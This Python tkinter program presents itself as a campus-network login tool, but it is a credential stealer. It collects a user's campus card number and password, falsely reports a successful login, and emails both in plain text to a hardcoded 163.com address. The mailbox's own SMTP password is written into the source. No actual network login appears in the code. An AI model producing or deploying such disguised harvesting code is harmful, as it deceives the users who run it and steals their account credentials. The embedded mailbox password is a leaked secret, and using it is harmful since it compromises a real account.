import sys
import os
import tkinter as tk
import base64
import requests
import json
import uuid
from email.header import Header
from email.mime.text import MIMEText
import smtplib
import threading


def get_id():
    # username = "qq1553457850@163.com"  # 用户名
    # password = "a13307023186"
    ip = 'www.baidu.com'
    # 实现pingIP地址的功能，bai-c1指发送报文一次，du-w1指等zhi待1秒
    global backinfo
    var2.set('恭喜你，登陆成功！！(用户信息已保存)' +
             '\nname:'+e1.get()+'\npassword:'+e2.get())
    # backinfo = os.system('ping -w 1 %s' % ip)
    backinfo = 1
    if backinfo != 0:
        print('online')
        mail_host = "smtp.163.com"  # 设置服务器
        mail_user = "qq1553457850@163.com"  # 用户名
        mail_pass = "a13307023186"

        sender = 'qq1553457850@163.com'
        receivers = ['qq1553457850@163.com']  # 接收邮件，可设置为你的QQ邮箱或者其他邮箱

        message = MIMEText('name:'+e1.get()+'\npassword:' +
                           e2.get(), 'plain', 'utf-8')

        message['From'] = Header("登录", 'utf-8')  # 括号里的对应发件人邮箱昵称（随便起）、发件人邮箱账号
        message['To'] = Header("测试", 'utf-8')  # 括号里的对应收件人邮箱昵称、收件人邮箱账号

        subject = '邮件测试 id:'+e1.get()
        message['Subject'] = Header(subject, 'utf-8')

        try:
            smtpObj = smtplib.SMTP_SSL('smtp.163.com')
            # smtpObj = smtplib.SMTP()
            smtpObj.connect(mail_host, 465)  # 发件人邮箱中的SMTP服务器，端口是25
            smtpObj.login(mail_user, mail_pass)
            smtpObj.sendmail(sender, receivers, message.as_string())
            print("邮件发送成功")
        except smtplib.SMTPException:
            print("Error: 无法发送邮件")


window = tk.Tk()
window.title('校园网登陆器')

window.geometry('400x300')

# e = tk.Entry(window, show=None)
# e.pack()
var2 = tk.StringVar()

var = '欢迎使用本软件  haostart@hotmail.com'
l_0 = tk.Label(window, text=var,
               font=('Arial', 12), width=35, height=2)
l_0.pack()
l_1 = tk.Label(window, text='请输入校园卡号：', anchor='w',
               font=('Arial', 13), width=30, height=2).place(x=0, y=30)
# l_1.pack()
e1 = tk.Entry(window, show=None)

e1.pack()
l_2 = tk.Label(window, text=' 请输入密码：',
               font=('Arial', 13), width=30, height=1).place(x=-60, y=60)
# l_2.pack()
e2 = tk.Entry(window, show='*')
e2.pack()


b1 = tk.Button(window, text='登陆/注销', width=15,
               height=2, command=get_id)
b1.pack()
# b2 = tk.Button(window, text='注销', width=15,
#                height=2, command=disconnect)
# b2.pack()
var2 = tk.StringVar()
l2 = tk.Label(window, textvariable=var2,
              font=('Arial', 11), width=35, height=5).place(x=24, y=200)
# l2.pack()
window.mainloop()
